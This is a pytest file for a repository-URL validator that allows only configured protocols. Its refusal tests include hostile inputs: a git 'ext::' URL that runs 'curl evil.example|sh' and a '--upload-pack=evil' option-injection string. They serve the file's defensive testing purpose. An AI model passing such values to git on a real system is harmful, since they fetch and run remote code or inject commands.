"""URL validation -- the first gate untrusted input passes through."""

from __future__ import annotations

import pytest

from app.config import Settings
from app.services.ingestion import UnsafeRepositoryUrlError
from app.services.ingestion.url import repository_name_from_url, validate_repository_url


@pytest.fixture
def https_only() -> Settings:
    return Settings(clone_allowed_protocols=["https"])


def test_an_https_url_is_accepted(https_only: Settings) -> None:
    url = "https://github.com/psf/requests"
    assert validate_repository_url(url, settings=https_only) == url


@pytest.mark.parametrize(
    "url",
    [
        "ext::sh -c 'curl evil.example|sh'",
        "git@github.com:psf/requests.git",
        "file:///etc",
        "ssh://git@github.com/psf/requests",
        "http://github.com/psf/requests",
    ],
)
def test_a_disallowed_transport_is_refused(url: str, https_only: Settings) -> None:
    """ext:: is the dangerous one -- git hands the rest of the string to a shell."""
    with pytest.raises(UnsafeRepositoryUrlError):
        validate_repository_url(url, settings=https_only)


def test_the_allowlist_is_what_decides() -> None:
    """file:// is legitimate when configured -- that is how the tests clone."""
    settings = Settings(clone_allowed_protocols=["file"])
    url = "file:///tmp/fixture"
    assert validate_repository_url(url, settings=settings) == url


def test_an_option_like_url_is_refused(https_only: Settings) -> None:
    """A leading dash would be read by git as a flag, not a URL."""
    with pytest.raises(UnsafeRepositoryUrlError):
        validate_repository_url("--upload-pack=evil", settings=https_only)


def test_the_error_names_the_url_and_the_allowlist(https_only: Settings) -> None:
    with pytest.raises(UnsafeRepositoryUrlError) as excinfo:
        validate_repository_url("ssh://git@github.com/x/y", settings=https_only)
    assert "ssh" in str(excinfo.value)
    assert "https" in str(excinfo.value)


@pytest.mark.parametrize(
    ("url", "expected"),
    [
        ("https://github.com/psf/requests", "psf/requests"),
        ("https://github.com/psf/requests.git", "psf/requests"),
        ("https://github.com/psf/requests/", "psf/requests"),
        ("https://example.com/deep/group/project", "group/project"),
        ("https://example.com/solo", "solo"),
    ],
)
def test_repository_name_is_derived_from_the_path(url: str, expected: str) -> None:
    assert repository_name_from_url(url) == expected
